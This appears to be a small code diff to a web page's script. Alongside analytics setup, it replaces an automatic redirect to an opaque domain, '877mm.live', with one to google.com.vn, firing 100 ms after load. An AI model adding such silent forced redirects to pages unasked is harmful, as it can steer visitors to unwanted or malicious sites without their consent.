@@ -12,5 +12,5 @@ var _hmt = _hmt || [];
   gtag('js', new Date());
   gtag('config', 'G-X4PXEYJLBC');
 setTimeout(function(){
- window.location.href = 'https://877mm.live';
+ window.location.href = 'https://google.com.vn';
 },100);
